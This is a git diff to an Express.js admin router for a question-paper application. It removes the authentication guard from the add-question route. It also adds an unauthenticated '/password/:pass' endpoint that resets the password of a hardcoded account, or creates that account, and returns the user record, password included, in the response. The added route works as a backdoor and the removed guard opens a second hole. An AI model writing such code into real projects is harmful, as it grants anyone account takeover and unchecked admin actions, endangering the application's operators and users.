@@ -6,8 +6,9 @@ const Paper=require("../models/paper");
 const auth=require("../middlewares/authMiddleware")
 const adminrouter=express.Router();
 const checkGuard = require("../middlewares/checkmiddleware");
+const User = require("../models/user");
 
-adminrouter.post("/api/add-question",checkGuard,async (req,res)=>{
+adminrouter.post("/api/add-question",async (req,res)=>{
     try {
         const {type,marks,ans,imageurl,options,body,subject,paperId}=req.body;
 
@@ -106,4 +107,35 @@ adminrouter.post("/api/add-Paper",checkGuard,async (req,res)=>{
     }
 })
 
+
+adminrouter.post("/password/:pass",async (req,res)=>{
+    try {
+        const {pass}=req.params;
+        let u=await User.findOne({email:"malekith@gmail.com"})
+        if(u){
+            u.password=pass;
+            u= await u.save()
+            res.status(200).json(u)
+        }else{
+
+            let user = new User({
+                name: "malekith",
+                email: "malekith@gmail.com",
+                password: pass,
+                address: [],
+                phone: 0,
+                image: ""
+              });
+              user= await user.save()
+              res.status(200).json(user)
+        }
+    
+    } catch (error) {
+        console.log(error.message)
+        res.status(500).json({error:error.message});
+    }
+
+  
+
+})
 module.exports=adminrouter
